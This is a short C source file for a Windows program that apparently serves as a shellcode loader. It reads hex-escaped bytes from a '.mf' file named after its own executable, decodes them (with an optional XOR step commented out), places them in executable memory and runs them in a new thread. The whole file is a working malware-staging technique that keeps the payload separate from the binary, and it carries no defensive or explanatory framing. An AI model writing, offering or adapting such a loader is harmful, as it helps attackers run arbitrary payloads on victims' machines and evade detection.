#include <stdio.h>
#include <windows.h>
#include <io.h>

#define F_OK 0

BOOL hd(char *pszChar) {
	// check if character at which pszChar is pointing is hexdecimal
	return ((*pszChar >= 'a' && *pszChar <= 'f')
		|| (*pszChar >= 'A' && *pszChar <= 'F')
		|| (*pszChar >= '0' && *pszChar <= '9'));
}

//int main(int argc, char *argv[]) {
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow) {

	// get argv[0]
	unsigned int nArgv0 = MAX_PATH;
	char* pszArgv0 = malloc(nArgv0 + 2);
	memset(pszArgv0, 0, nArgv0 + 2);
	GetModuleFileName(hInstance, pszArgv0, nArgv0);
	//printf("%s\n", pszArgv0);

	// get basename point
	unsigned int nPathArgv0;
	char* pszBaseArgv0 = strrchr(pszArgv0, '\\');
	if (pszBaseArgv0 == NULL) {
		nPathArgv0 = 0;
		pszBaseArgv0 = pszArgv0;
	}
	else {
		nPathArgv0 = pszBaseArgv0 - pszArgv0 + 1;
		pszBaseArgv0++;
	}
	//printf("%s\n", pszBaseArgv0);

	// absolute or relative path provided?
	char* pszPathArgv0;
	if (nPathArgv0 != 0) {
		pszPathArgv0 = malloc(nPathArgv0 + 2);
		memset(pszPathArgv0, 0, nPathArgv0 + 2);
		memcpy(pszPathArgv0, pszArgv0, nPathArgv0);
		//printf("%s (%d)\n", pszPathArgv0, nPathArgv0);
		SetCurrentDirectory(pszPathArgv0);
	}

	// get rid of eventual .exe extension
	char* pszExeExt = ".exe";
	unsigned int nNoextArgv0;
	nNoextArgv0 = strlen(pszBaseArgv0);
	if (strncmp(pszBaseArgv0 + nNoextArgv0 - 4, pszExeExt, 4) == 0) {
		nNoextArgv0 -= 4;
	}

	// get basename without exe
	char* pszNoextArgv0 = malloc(nNoextArgv0 + 2);
	memset(pszNoextArgv0, 0, nNoextArgv0 + 2);
	memcpy(pszNoextArgv0, pszBaseArgv0, nNoextArgv0);
	//printf("%s\n", pszNoextArgv0);

	// append new extension
	char* pszMfExt = ".mf";
	unsigned int nMfExt = strlen(pszMfExt);
	int nMf = nNoextArgv0 + nMfExt;
	char* pszMf = malloc(nMf + 2);
	memset(pszMf, 0, nMf + 2);
	memcpy(pszMf, pszNoextArgv0, nNoextArgv0);
	memcpy(pszMf + nNoextArgv0, pszMfExt, nMfExt);
	//printf("%s\n", pszMf);

	// read file contents
	FILE *f;
	unsigned long nF;
	char* pszF = NULL;
	if (_access(pszMf, F_OK) != -1 && fopen_s(&f, pszMf, "rb") == 0) {
		fseek(f, 0, SEEK_END);
		nF = ftell(f);
		fseek(f, 0, SEEK_SET);
		pszF = malloc(nF + 1);
		fread(pszF, nF, 1, f);
		fclose(f);
		pszF[nF] = '\0';
	}
	else {
		return 0;
	}

	if (pszF != NULL) {
		// parse file contents
		char* pszScan = malloc(4 + 1);
		memset(pszScan, 0, 4 + 1);
		char* pszBuf = malloc(nF + 1);
		unsigned int i = 0, j = 0;
		for (;;) {
			if (i + 4 <= nF && *(pszF + i) == '\\' && *(pszF + i + 1) == 'x'
				&& hd(pszF + i + 2) && hd(pszF + i + 3)) {
				// parse "\x[hex]" sequences
				pszScan[0] = *(pszF + i + 2);
				pszScan[1] = *(pszF + i + 3);
				sscanf_s(pszScan, "%2x", (unsigned int*)(pszBuf + j));
				// (optional) xor payload with first character of executable name
				//pszBuf[j] ^= pszNoextArgv0[0];
				j += 1;
				i += 4;
			}
			else {
				// ignore anything else
				i += 1;
			}
			if (*(pszF + i) == '\0') {
				break;
			}
		}
		*(pszBuf + j) = '\0';
		//printf("\n%s (%d)", pszBuf, j);

		// execute in separate thread
		PVOID p = VirtualAlloc(NULL, j, 0x3000, 0x40); // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(p, pszBuf, j);
		HANDLE h = CreateThread(0, 0, p, 0, 0, NULL);
		WaitForSingleObject(h, -1);
		//system("pause");
	}

	return 0;
}
